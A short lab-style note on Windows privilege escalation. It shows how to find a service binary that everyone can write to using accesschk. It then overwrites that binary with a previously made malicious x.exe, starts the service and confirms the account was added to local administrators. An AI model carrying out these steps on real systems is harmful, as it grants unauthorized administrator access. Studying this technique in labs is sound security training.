# Executable files 

A Windows service is a program that runs in the background and if a executable file is running as service with full access then it is exploitable 

**Victim**

```
//Open command prompt
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

// Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file
```

**Exploitation**

```
// we generated the malicious x.exe file in registry exploit, now use this here 

// Open command prompt
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc

// It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt
net localgroup administrators
```
